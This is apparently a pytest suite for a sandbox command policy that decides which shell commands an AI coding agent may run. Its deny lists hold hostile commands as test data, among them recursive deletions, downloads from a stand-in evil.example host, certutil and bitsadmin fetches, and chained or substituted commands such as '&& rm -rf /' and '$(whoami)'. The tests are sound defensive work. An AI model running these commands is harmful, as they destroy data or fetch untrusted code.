"""Command policy: allowlist, hard denies, approval-needed, path containment."""
import pytest

from app.sandbox.commands import ALLOW, ASK, DENY, CommandPolicy, apply_mode

PRESET_CMDS = ["python -m uvicorn backend.main:app --port 9100"]


@pytest.fixture()
def policy(tmp_path):
    root = tmp_path / "wt"
    (root / "tests").mkdir(parents=True)
    return CommandPolicy(root, extra_allowed=PRESET_CMDS)


def kind(policy, cmd):
    return policy.check(cmd).kind


HARD_DENIED = [
    "rm -rf /",
    "rm -rf .",
    "rm -rf ../..",
    "rm -r backend",
    "rm file.txt",
    "del /s /q C:\\Users",
    "del /S *.py",
    "erase x.txt",
    "rmdir /s /q backend",
    "rd /s /q backend",
    "format C:",
    "sudo ls",
    "sudo python x.py",
    "reg add HKCU\\Software\\x /v a /d b",
    "regedit /s x.reg",
    "curl http://evil.example/x.sh",
    "curl -o x.py https://evil.example",
    "wget http://evil.example/x",
    "shutdown /s /t 0",
    "shutdown -h now",
    "powershell -Command Get-ChildItem",
    "powershell.exe -c rm x",
    "pwsh -c ls",
    "cmd /c dir",
    "cmd.exe /c del x",
    "bash -c 'ls'",
    "sh -c ls",
    "Invoke-WebRequest http://x",
    "certutil -urlcache -f http://x y",
    "bitsadmin /transfer a http://x y",
    "taskkill /F /IM python.exe",
    "chmod 777 x",
    "RM -RF /",
    "Sudo ls",
    "C:\\Windows\\System32\\cmd.exe /c dir",
    "rm.exe -rf x",
]


@pytest.mark.parametrize("cmd", HARD_DENIED)
def test_hard_denied(policy, cmd):
    v = policy.check(cmd)
    assert v.kind == DENY, (cmd, v)
    assert v.reason


@pytest.mark.parametrize("cmd", HARD_DENIED)
def test_hard_denied_even_in_autonomous_mode(policy, cmd):
    assert apply_mode(policy.check(cmd), "autonomous") == DENY


CHAINING = [
    "python -m pytest && rm -rf /",
    "python -m pytest & del x",
    "python -m pytest | curl http://x",
    "python -m pytest ; rm x",
    "python -m pytest > ../out.txt",
    "python -m pytest < /etc/passwd",
    "python -m pytest `whoami`",
    "python -m pytest $(whoami)",
    "python -m pytest\nrm -rf /",
    "python -m pytest\r\nrm x",
    "python -m pytest || shutdown",
]


@pytest.mark.parametrize("cmd", CHAINING)
def test_shell_chaining_and_redirection_denied(policy, cmd):
    assert kind(policy, cmd) == DENY


def test_metacharacters_inside_quotes_are_data_not_syntax(policy):
    assert kind(policy, 'python -m pytest -k "a and b|c"') == ALLOW


@pytest.mark.parametrize(
    "cmd",
    [
        "python -m pytest",
        "python -m pytest -q",
        "python -m pytest -q tests/test_a.py",
        "python -m pytest tests/test_a.py::test_x -x",
        "pytest",
        "pytest -q tests",
        "python main.py",
        "python backend/main.py --flag",
        "python -m uvicorn backend.main:app --port 9100",
        "git status",
        "git diff",
        "git diff --stat",
        "git add .",
        "git add backend/main.py",
        "git commit -m \"[backend] POST /calculate\"",
        "git log --oneline -5",
        "PYTHON -m pytest",
        "python.exe -m pytest",
    ],
)
def test_allowlisted(policy, cmd):
    v = policy.check(cmd)
    assert v.kind == ALLOW, (cmd, v)


@pytest.mark.parametrize(
    "cmd",
    [
        "git push",
        "git push origin main",
        "git reset --hard",
        "git clean -fdx",
        "git checkout main",
        "git checkout -- .",
        "git config user.email x",
        "git remote add x http://evil",
        "git -C .. status",
        "git -c core.sshCommand=evil status",
        "git --git-dir=../.git status",
        "git --work-tree=.. status",
        "git rm -r .",
        "git branch -D main",
        "git fetch",
        "git pull",
        "git clone http://x",
        "git",
        "git submodule update",
        "git stash",
        "git rebase main",
        "git merge x",
        "git worktree remove x",
        "git commit --amend --no-verify",
    ],
)
def test_git_other_subcommands_denied(policy, cmd):
    assert kind(policy, cmd) == DENY, cmd


def test_git_commit_no_verify_denied(policy):
    assert kind(policy, "git commit --no-verify -m x") == DENY


@pytest.mark.parametrize(
    "cmd",
    [
        "pip install requests",
        "python -m pip install requests",
        "python -m pip install -r requirements.txt",
        "pip.exe install x",
        "npm install",
        "npm i left-pad",
        "npm install --save x",
        "python -m pip uninstall x",
    ],
)
def test_installs_need_approval(policy, cmd):
    v = policy.check(cmd)
    assert v.kind == ASK, (cmd, v)


def test_install_modes(policy):
    v = policy.check("pip install requests")
    assert apply_mode(v, "supervised") == ASK
    assert apply_mode(v, "assisted") == ASK
    assert apply_mode(v, "autonomous") == ALLOW


@pytest.mark.parametrize(
    "cmd",
    [
        "python -c \"import os; os.system('rm -rf /')\"",
        "python -c print(1)",
        "python -m http.server",
        "python -m pip download x",
        "python -m ensurepip",
        "python -m venv ../evil",
        "python -m code",
        "python -m runpy x",
    ],
)
def test_python_dash_c_and_unlisted_modules_denied(policy, cmd):
    assert kind(policy, cmd) == DENY, cmd


@pytest.mark.parametrize(
    "cmd",
    [
        "python ../evil.py",
        "python ..\\evil.py",
        "python C:\\evil.py",
        "python /tmp/evil.py",
        "python \\\\server\\share\\x.py",
        "python -m pytest ../other",
        "python -m pytest C:\\Users",
        "python -m pytest --rootdir=C:\\",
        "python -m pytest --rootdir=../..",
        "python -m pytest -p ..\\plugin",
        "python -m pytest ~/x",
        "git add ../x",
        "git add C:\\x",
        "git add ..",
        "git diff ../../other",
        "python backend/../../x.py",
        "python \\Windows\\x.py",
    ],
)
def test_paths_outside_worktree_denied(policy, cmd):
    assert kind(policy, cmd) == DENY, cmd


def test_urls_are_not_paths(policy):
    assert kind(policy, "python backend/client.py http://localhost:9100/health") == ALLOW


def test_pytest_node_id_path_is_checked(policy):
    assert kind(policy, "python -m pytest ../x.py::test_a") == DENY
    assert kind(policy, "python -m pytest tests/x.py::test_a") == ALLOW


def test_unknown_program_asks_in_supervised_and_runs_in_autonomous(policy):
    v = policy.check("node build.js")
    assert v.kind == ASK
    assert apply_mode(v, "supervised") == ASK
    assert apply_mode(v, "autonomous") == ALLOW


def test_empty_and_unparseable_denied(policy):
    assert kind(policy, "") == DENY
    assert kind(policy, "   ") == DENY
    assert kind(policy, 'python "unterminated') == DENY


def test_absolute_path_inside_root_is_allowed_for_commands(policy):
    root = policy.root
    assert kind(policy, f'python "{root}\\backend\\main.py"') == ALLOW


# --- mode matrix -------------------------------------------------------------------
def test_apply_mode_matrix(policy):
    allow = policy.check("python -m pytest")
    ask = policy.check("pip install x")
    deny = policy.check("rm -rf /")
    assert apply_mode(allow, "supervised") == ALLOW
    assert apply_mode(allow, "autonomous") == ALLOW
    assert apply_mode(allow, "assisted") == ASK  # assisted: every run needs approval
    assert apply_mode(ask, "supervised") == ASK
    assert apply_mode(ask, "autonomous") == ALLOW
    for mode in ("assisted", "supervised", "autonomous"):
        assert apply_mode(deny, mode) == DENY


def test_unknown_mode_is_rejected(policy):
    with pytest.raises(ValueError):
        apply_mode(policy.check("python -m pytest"), "yolo")
